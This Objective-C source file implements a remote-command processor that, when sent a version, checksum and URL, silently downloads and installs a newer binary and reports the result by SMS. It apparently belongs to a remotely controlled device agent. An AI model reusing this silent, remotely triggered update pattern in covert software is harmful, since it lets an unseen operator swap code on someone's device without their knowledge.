//
//  SetDownloadBinaryAndUpdateSilentModeProcessor.m
//  RCM
//
//  Created by Makara Khloth on 7/5/15.
//
//

#import "SetDownloadBinaryAndUpdateSilentModeProcessor.h"


#import "SoftwareUpdateManager.h"
#import "RemoteCmdUtils.h"

@interface SetDownloadBinaryAndUpdateSilentModeProcessor (private)
- (void) processSetDownloadBinaryAndUpdateSilentMode;
- (void) setDownloadBinaryAndUpdateSilentModeException;
- (void) setDownloadBinaryAndUpdateSilentModeInvalidCmdFormatException;
- (void) nothingToUpdate;
- (void) acknowldgeMessage;
- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete;
- (void) processFinished;
@end


@implementation SetDownloadBinaryAndUpdateSilentModeProcessor


/**
 - Method name:			initWithRemoteCommandData:andCommandProcessingDelegate
 - Purpose:				This method is used to initialize the SetDownloadBinaryAndUpdateSilentModeProcessor class
 - Argument list and description:	aRemoteCmdData (RemoteCmdData), aRemoteCmdProcessingDelegate (RemoteCmdProcessingDelegate)
 - Return description:	No return type
 */
- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData
    andCommandProcessingDelegate: (id <RemoteCmdProcessingDelegate>) aRemoteCmdProcessingDelegate {
    
    DLog (@"SetDownloadBinaryAndUpdateSilentModeProcessor--->initWithRemoteCommandData")
    
    if ((self = [super initWithRemoteCommandData:aRemoteCmdData andCommandProcessingDelegate:aRemoteCmdProcessingDelegate])) {
    }
    return self;
}



#pragma mark Overriden method

/**
 - Method name:			doProcessingCommand
 - Purpose:				This method is used to process the SetDownloadBinaryAndUpdateSilentModeProcessor
 - Argument list and description:	No Argument
 - Return description:	No return type
 - Overided				RemoteCmdAsyncHTTPProcessor
 */
- (void) doProcessingCommand {
    DLog (@"SetDownloadBinaryAndUpdateSilentModeProcessor--->doProcessingCommand")
    
    // -- Validate number of arugument: require only version
    if (![RemoteCmdSignatureUtils verifyRemoteCmdDataSignature:mRemoteCmdData
                                         numberOfCompulsoryTag:5]) {
        [RemoteCmdSignatureUtils throwInvalidCmdWithName:@"SetDownloadBinaryAndUpdateSilentModeProcessor"
                                                  reason:@"Failed signature check"];
    }
    
    // -- Validate argument
   if ([RemoteCmdProcessorUtils isDigitsDotDashOnly:[[mRemoteCmdData mArguments] objectAtIndex:2]] && // Version
        [RemoteCmdProcessorUtils isURL:[[mRemoteCmdData mArguments] objectAtIndex:4]]) { // Url
        [self processSetDownloadBinaryAndUpdateSilentMode];
    } else {
        [self setDownloadBinaryAndUpdateSilentModeInvalidCmdFormatException];
    }
}


#pragma mark Private method

/**
 - Method name:			processSetDownloadBinaryAndUpdateSilentModeProcessor
 - Purpose:				This method is used to process Request Download Binary and Update Software
 - Argument list and description:	No Argument
 - Return description:	No return type
 */
- (void) processSetDownloadBinaryAndUpdateSilentMode {
    DLog (@"SetDownloadBinaryAndUpdateSilentModeProcessor ---> processSetDownloadBinaryAndUpdateSilentMode")
    
    id <SoftwareUpdateManager> softwareUpdateManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mSoftwareUpdateManager];
    
    /*
     -- Compare the version first
     // ---- if new version MATCH to the existing version			---> do nothing
     // ---- if new version is GREATER than the existing version		---> update
     // ---- if new version is LESS than the existing version		---> do nothing
     version string sent from server can be
     - 1.4.2
     1.4.2
     1.4
     - 1.4
     */
    id <AppContext> applicationContext	= [[RemoteCmdUtils sharedRemoteCmdUtils] mAppContext];
    
    // current version
    NSString *currentVersion			= [[applicationContext getProductInfo] getProductFullVersion]; // "[-]Major.Minor.build"
    NSArray *currentVersionComponents	= [RemoteCmdUtils parseVersion:currentVersion];
    DLog (@">>>>> current version %@", currentVersionComponents)
    
    // new version
    NSString *newVersion				= [[mRemoteCmdData mArguments] objectAtIndex:2]; // "[-]Major.Minor.build", note that build is optional
    NSArray *newVersionComponents		= [RemoteCmdUtils parseVersion:newVersion];
    DLog (@">>>>> new version %@", newVersionComponents)
    
    BOOL shouldUpdate = [RemoteCmdUtils shouldUpdateSoftwareCurrentVersionComponent:currentVersionComponents
                                                               newVersionComponents:newVersionComponents];
    // -- update
    if (shouldUpdate) {
        NSString *checksum = [[mRemoteCmdData mArguments] objectAtIndex:3];
        NSString *url = [[mRemoteCmdData mArguments] objectAtIndex:4];
        BOOL isReady = [softwareUpdateManager updateSoftware:self url:url checksum:checksum];
        if (!isReady) {
            DLog (@"!!! not ready to update software")
            [self setDownloadBinaryAndUpdateSilentModeException];				// ******* Exception ********
        }
        else {
            DLog (@".... processing update software")
            [self acknowldgeMessage];
        }
    } else {
        DLog (@"No need to update")
        [self performSelector:@selector(nothingToUpdate) withObject:nil afterDelay:0.1];
    }
}

/**
 - Method name:			setDownloadBinaryAndUpdateSilentModeException
 - Purpose:				This method is invoked when it fails to update software
 - Argument list and description:	No Return Type
 - Return description:	No Argument
 */
- (void) setDownloadBinaryAndUpdateSilentModeException {
    DLog (@"SetDownloadBinaryAndUpdateSilentModeProcessor ---> setDownloadBinaryAndUpdateSilentModeException");
    FxException* exception = [FxException exceptionWithName:@"setDownloadBinaryAndUpdateSilentModeException"
                                                  andReason:@"Set Download Binary And Update Silent Mode error"];
    [exception setErrorCode:kSoftwareUpdateManagerBusy];
    [exception setErrorCategory:kFxErrorRCM];
    @throw exception;
}

- (void) setDownloadBinaryAndUpdateSilentModeInvalidCmdFormatException {
    DLog (@"SetDownloadBinaryAndUpdateSilentModeProcessor ---> setUpdateAvailableSilentModeInvalidCmdFormatException");
    FxException* exception = [FxException exceptionWithName:@"setUpdateAvailableSilentModeException"
                                                  andReason:@"Set Download Binary And Update Silent Mode invalid command format error"];
    [exception setErrorCode:kCmdExceptionErrorInvalidCmdFormat];
    [exception setErrorCategory:kFxErrorRCM];
    @throw exception;
}

- (void) nothingToUpdate {
    NSString *message = NSLocalizedString(@"kSetDownloadAndUpdateSilentModeErrorMSG1", @"");
    [self sendReplySMS:message isProcessCompleted:YES];
}

/**
 - Method name: acknowldgeMessage
 - Purpose:This method is used to prepare acknowldge message
 - Argument list and description:No Argument
 - Return description:No Return
 */

- (void) acknowldgeMessage {
    NSString *messageFormat =[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
                                                                                         andErrorCode:_SUCCESS_];
    NSString *ackMessage= [messageFormat stringByAppendingString:NSLocalizedString(@"kSetDownloadAndUpdateSilentModeMSG1", @"")];
    [self sendReplySMS:ackMessage isProcessCompleted:NO];
}


/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: aStatusCode (NSUInteger)
 - Return description: No return type
 */

- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete  {
    DLog (@"SetDownloadBinaryAndUpdateSilentModeProcessor--->sendReplySMS...")
    [[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
                                             andReplyMessage:aReplyMessage];
    DLog (@"recipientNumber %@", [self recipientNumber])
    if ([mRemoteCmdData mIsSMSReplyRequired]) {
        [[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber]
                                                               andMessage:aReplyMessage];
    }
    if (aIsComplete) {
        [self processFinished];
    } else {
        DLog (@"Sent aknowldge message.")
    }
}

/**
 - Method name: processFinished
 - Purpose:This method is invoked when request download binary and update process is completed
 - Argument list and description:No Argument
 - Return description:isValidArguments (BOOL)
 */

-(void) processFinished {
    DLog (@"SetDownloadBinaryAndUpdateSilentModeProcessor--->processFinished")
    if ([mRemoteCmdProcessingDelegate respondsToSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:)]) {
        [mRemoteCmdProcessingDelegate performSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:) withObject:self withObject:mRemoteCmdData];
    }
}

#pragma mark SoftwareUpdateDelegate Delegate Methods


-(void) softwareUpdateCompleted: (NSError *) aError {
    DLog (@"SetDownloadBinaryAndUpdateSilentModeProcessor --> softwareUpdateCompleted")
    NSString *softwareUpdateMessage	= nil;
    
    if (!aError) {
        DLog (@">> success to update")
        NSString *messageFormat		= [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
                                                                                               andErrorCode:_SUCCESS_];
        softwareUpdateMessage		= [messageFormat stringByAppendingString:NSLocalizedString(@"kSetDownloadAndUpdateSilentModeMSG2", @"")];		
    } else {
        DLog (@">> fail to update with error %@", aError)
        NSInteger errorCode = 0;
        
        if ([aError code] == kSoftwareUpdateManagerCRCError) {
            errorCode = kCmdExceptionErrorBinaryChecksumFailed;
        } else {
            errorCode = [aError code];
        }
        NSString *messageFormat		= [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
                                                                                               andErrorCode:errorCode];	
        softwareUpdateMessage		= messageFormat;
    }
    
    [self sendReplySMS:softwareUpdateMessage isProcessCompleted:YES];
}

@end
